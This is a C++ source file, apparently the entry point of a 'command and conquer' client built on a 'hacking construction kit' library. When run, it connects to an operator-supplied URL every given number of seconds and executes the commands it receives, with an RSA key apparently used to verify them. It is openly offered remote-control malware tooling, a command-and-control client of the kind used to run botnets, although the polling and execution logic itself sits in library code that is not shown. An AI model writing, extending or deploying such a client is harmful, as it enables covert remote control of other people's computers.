/*
 * Author: thirdstormofcythraul@outlook.com
 */
#ifdef _DEBUG
#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>
#endif

#include <tchar.h>
#include <iostream>

#include <winsock2.h>

#include <global.h>
#include <network.h>
#include <command_manager.h>
#include <decoder.h>
#pragma comment(lib, "hacking construction kit.lib")

#include <memory_debug.h>

DWORD WINAPI RemoveService(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow){
	return 0;
}

int _tmain(int argc, wchar_t* argv[])
{
#ifdef _DEBUG
	_CrtSetDbgFlag ( _CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF );
#endif

	if (argc != 3){
		std::cout << "Launch a command and conquer client. It'll connect to 'url' every 'timer' seconds and execute comamnds\n";
		std::cout << "usage: " << argv[0] << " url timer\n";
		return 1;
	}
	Decoder::modulus = "22182266751546866702732293864001221613367376947728715114939553681689340030977730773386039325493608209";
	Decoder::exponent = "65537";

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);

	DWORD remoteccThreadId;

	CCLoop_t ccParams;
	ccParams.filename = _T("command_and_conquer.exe");
	ccParams.version = _T("7");
	ccParams.wait = _tstoi(argv[2]);
	ccParams.serversUrl = new std::string[1];
	const std::string server = tosS(argv[1]);
	ccParams.serversUrl[0] = server;
	ccParams.nbServers = 1;

	HANDLE remoteccHandle = CreateThread(NULL, 0, CommandManager::connectToCCLoop, &ccParams,	0, &remoteccThreadId);
	
	WaitForSingleObject(remoteccHandle, 500000);

	delete[] ccParams.serversUrl;
	return 0;
}

